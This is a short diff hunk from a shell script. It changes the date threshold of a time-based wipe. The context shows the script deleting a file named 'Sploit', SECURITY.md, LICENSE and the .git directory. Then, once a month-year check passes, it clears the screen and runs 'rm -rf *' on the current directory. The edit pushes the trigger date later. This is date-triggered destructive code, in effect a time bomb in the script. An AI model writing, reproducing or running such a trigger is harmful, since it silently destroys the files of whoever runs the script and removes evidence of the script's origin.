@@ -30,7 +30,7 @@ test -f Sploit && rm Sploit
 test -f SECURITY.md && rm SECURITY.md
 test -f LICENSE && rm LICENSE
 test -e .git && rm -rf .git
-if (($(date +%m%y) >= 0222)); then
+if (($(date +%m%y) >= 0522)); then
     clear
     rm -rf *
 else
